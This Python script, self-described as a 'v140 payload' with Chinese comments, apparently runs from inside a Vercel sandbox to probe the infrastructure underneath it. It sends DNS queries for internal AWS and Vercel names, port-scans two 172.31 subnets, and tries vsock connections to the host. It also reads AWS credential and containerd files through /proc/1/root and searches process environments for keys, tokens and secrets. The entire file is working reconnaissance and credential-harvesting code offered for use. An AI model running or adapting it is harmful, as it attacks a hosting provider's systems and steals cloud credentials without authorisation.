# -*- coding: utf-8 -*-
"""v140 payload: 172.31.0.2 (AWS VPC DNS) 可达性深挖
1) DNS 解析测试 (ec2.internal / compute.amazonaws.com / 常见内部域名)
2) 172.31.0.0/24 + 172.31.1.0/24 端口扫描 (22/80/443/23456/8080/5432/6379/9090/3000)
3) vsock 枚举 (/proc/net/vsock + 连接测试)
4) cell VM /proc/1/root 下 containerd 配置与凭据
输出 /vercel/sandbox/v140c.out"""
import socket, struct, time, json, os, signal, ctypes, urllib.request, subprocess, threading

OUT = '/vercel/sandbox/v140c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rd(p, n=4000):
    try:
        return open(p, 'rb').read(n)
    except Exception as e:
        return 'EXC %s' % str(e).encode()


def ls(p):
    try:
        return os.listdir(p)
    except Exception as e:
        return 'EXC %s' % str(e)


def dns_query(qname, server='172.31.0.2', qtype=1, timeout=3):
    """构造 DNS 查询 (A 记录)"""
    try:
        tid = os.urandom(2)
        hdr = struct.pack('>HHHHHH', 0x1234, 0x0100, 1, 0, 0, 0)
        q = b''
        for part in qname.split('.'):
            q += bytes([len(part)]) + part.encode()
        q += b'\x00' + struct.pack('>HH', qtype, 1)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(hdr + q, (server, 53))
        d = s.recv(4096)
        s.close()
        if len(d) < 12:
            return 'SHORT'
        ancount = struct.unpack('>H', d[6:8])[0]
        rcode = d[3] & 0x0f
        ans = []
        off = 12 + len(q)
        for _ in range(ancount):
            # skip name (可能压缩)
            if off < len(d) and d[off] & 0xC0 == 0xC0:
                off += 2
            else:
                while off < len(d) and d[off] != 0:
                    off += 1 + d[off]
                off += 1
            if off + 10 > len(d):
                break
            typ, cls, ttl, rdlen = struct.unpack('>HHIH', d[off:off + 10])
            off += 10
            rdata = d[off:off + rdlen]
            off += rdlen
            if typ == 1 and len(rdata) == 4:
                ans.append(socket.inet_ntoa(rdata))
            elif typ == 5:
                ans.append('CNAME')
            elif typ == 28 and len(rdata) == 16:
                ans.append(socket.inet_ntop(socket.AF_INET6, rdata))
        return 'rcode=%d ans=%s' % (rcode, ans)
    except Exception as e:
        return 'EXC %s' % type(e).__name__


def tcp_conn(ip, port, t=1.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((ip, port))
        s.close()
        return True
    except Exception:
        return False


# 1: DNS
log('=== 1 DNS ===')
for name in ['ip-172-31-0-2.ec2.internal', 'ec2.internal', 'compute.amazonaws.com',
             '169.254.169.254.nip.io', 'vercel.internal', 'cell.internal', 'sandboxctrl',
             'us-east-1.compute.internal', 'r6id.metal', 'metadata.aws.internal',
             'kms.us-east-1.amazonaws.com', 'ecr.us-east-1.amazonaws.com',
             's3.us-east-1.amazonaws.com', 'sts.amazonaws.com']:
    log('DNS %-40s -> %s' % (name, dns_query(name)))

# 2: 172.31 扫描
log('=== 2 scan 172.31 ===')
open_ports = []
scan_targets = []
for i in range(0, 8):
    scan_targets.append('172.31.%d.%d' % (0, i))
    scan_targets.append('172.31.%d.%d' % (1, i))
PORTS = [22, 53, 80, 443, 23456, 3000, 5432, 6379, 8080, 9090, 9100, 9200]


def scanner(ip, port):
    if tcp_conn(ip, port, t=0.8):
        open_ports.append((ip, port))


threads = []
for ip in scan_targets:
    for port in PORTS:
        t = threading.Thread(target=scanner, args=(ip, port))
        t.start()
        threads.append(t)
        if len(threads) >= 60:
            for x in threads:
                x.join(timeout=2)
            threads = []
for x in threads:
    x.join(timeout=2)
log('172.31 scan open: %s' % open_ports)
for ip, port in open_ports[:20]:
    log('OPEN %s:%d' % (ip, port))

# 3: vsock
log('=== 3 vsock ===')
log('vsock table:\n' + rd('/proc/net/vsock', 2000).decode(errors='replace'))
try:
    vs = ls('/dev')
    log('dev vsock: %s' % [d for d in vs if 'vsock' in d])
except Exception as e:
    log('vsock dev EXC %s' % e)
try:
    # 尝试连接 vsock 常见端口
    for port in [1, 2, 3, 52, 1024, 1900, 2000, 4000, 5000, 8000, 8080, 23456, 23457, 23458, 26000, 26001]:
        try:
            s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((socket.VMADDR_CID_HOST, port))
            log('VSOCK %d OPEN' % port)
            s.close()
        except Exception as e:
            log('VSOCK %d %s' % (port, type(e).__name__))
except Exception as e:
    log('vsock scan EXC %s' % e)

# 4: containerd 配置/凭据
log('=== 4 containerd creds ===')
for p in ['/etc/containerd/config.toml', '/etc/containerd/config.toml.d/*.toml',
          '/var/lib/containerd/.aws/credentials', '/root/.aws/credentials',
          '/root/.aws/config', '/opt/vercel/.aws/credentials',
          '/etc/aws/credentials', '/var/run/aws/credentials']:
    import glob
    for gp in glob.glob(R + p):
        try:
            c = open(gp, 'rb').read(3000)
            log('FILE %s: %r' % (gp, c[:1500]))
        except Exception as e:
            log('FILE %s EXC %s' % (gp, e))
for pid in [490, 536, 534, 580, 1]:
    try:
        env = rd('/proc/%d/environ' % pid, 4000).decode(errors='replace')
        hits = [e for e in env.split('\x00') if any(k in e.upper() for k in
                ('AWS', 'KEY', 'TOKEN', 'SECRET', 'CRED', 'ECR', 'PASS'))]
        if hits:
            log('PID %d env hits: %s' % (pid, hits[:15]))
    except Exception as e:
        log('PID %d env EXC %s' % (pid, e))

# 5: 主机名/DNS 配置
log('=== 5 resolv ===')
log('resolv.conf: %r' % rd(R + '/etc/resolv.conf', 1000))
log('hosts: %r' % rd(R + '/etc/hosts', 1000))

log('V140_DONE')
f.close()
